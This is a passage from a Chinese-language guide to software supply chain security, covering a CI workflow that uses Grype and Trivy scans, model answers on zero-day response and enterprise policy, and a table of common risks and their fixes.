        with:
          name: sbom
          path: sbom.cdx.json

  # 第三阶段：漏洞扫描
  vulnerability-scan:
    needs: generate-sbom
    runs-on: ubuntu-latest
    steps:
      - name: Download SBOM
        uses: actions/download-artifact@v3
        with:
          name: sbom

      - name: Scan with Grype
        uses: anchore/scan-action@v3
        with:
          sbom: sbom.cdx.json
          fail-build: true
          severity-cutoff: high

  # 第四阶段：容器扫描
  container-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t myapp:test .

      - name: Scan container
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:test
          exit-code: 1
          severity: CRITICAL,HIGH
```

**Q5: 如何响应新发现的零日漏洞（如 Log4Shell）？**

```
答案要点：

1. 快速识别（30分钟内）：
   - 使用 SBOM 查询受影响组件
   - 识别所有使用该组件的应用
   - 确定直接和传递依赖

2. 风险评估（1小时内）：
   - 评估漏洞是否可被利用
   - 检查是否有攻击迹象
   - 确定业务影响

3. 临时缓解（2小时内）：
   - 应用配置级缓解措施
   - 更新 WAF/防火墙规则
   - 考虑临时下线关键系统

4. 修复部署（24小时内）：
   - 测试更新的依赖版本
   - 逐步部署到生产环境
   - 监控异常行为

5. 事后总结：
   - 记录完整时间线
   - 更新事件响应流程
   - 改进 SBOM 覆盖率
```

### 安全策略设计题

**Q6: 设计企业级的供应链安全策略**

```
答案要点：

1. 依赖管理策略：
   - 使用私有包仓库镜像
   - 建立批准的依赖白名单
   - 定期审查和更新依赖
   - 锁定依赖版本

2. 构建安全：
   - 隔离的构建环境
   - 构建过程可重现
   - 构建产物签名
   - 构建日志审计

3. 供应商评估：
   - 评估第三方组件的安全性
   - 检查维护状态和社区活跃度
   - 审查安全历史记录

4. 持续监控：
   - 自动化漏洞扫描
   - 实时安全告警
   - 定期安全报告

5. 事件响应：
   - 预定义的响应流程
   - 自动化的影响分析
   - 快速修复机制
```

### 常见安全问题和解决方案

| 问题类型 | 风险等级 | 解决方案 |
|---------|---------|---------|
| 未锁定依赖版本 | 高 | 使用 lock 文件，固定版本号 |
| 缺少 SBOM | 中 | 集成 SBOM 生成到 CI/CD |
| 未验证包签名 | 高 | 启用包签名验证 |
| 过时的依赖 | 中 | 配置自动更新和定期审查 |
| 私有包暴露 | 高 | 使用命名空间和私有仓库 |
| 构建系统未隔离 | 严重 | 使用隔离的构建环境 |
| 缺少漏洞扫描 | 高 | 集成多种扫描工具 |
| 无应急响应计划 | 中 | 制定和演练响应流程 |

## 总结

软件供应链安全是一个复杂的多层次安全领域，需要从开发、构建、分发到运行时的全流程防护。核心原则包括：

1. **可见性**：使用 SBOM 了解软件的完整构成，追踪所有依赖
2. **验证**：通过签名和完整性检查验证所有组件的来源
3. **自动化**：将安全检查集成到 CI/CD 流程中，实现持续监控
4. **最小化**：只使用必要的依赖，减少攻击面
5. **响应准备**：建立完善的应急响应流程，能够快速应对安全事件

通过实施本文介绍的最佳实践，可以显著提升软件供应链的安全性，有效防范各类供应链攻击。记住，供应链安全不是一次性的工作，而是需要持续投入和改进的过程。
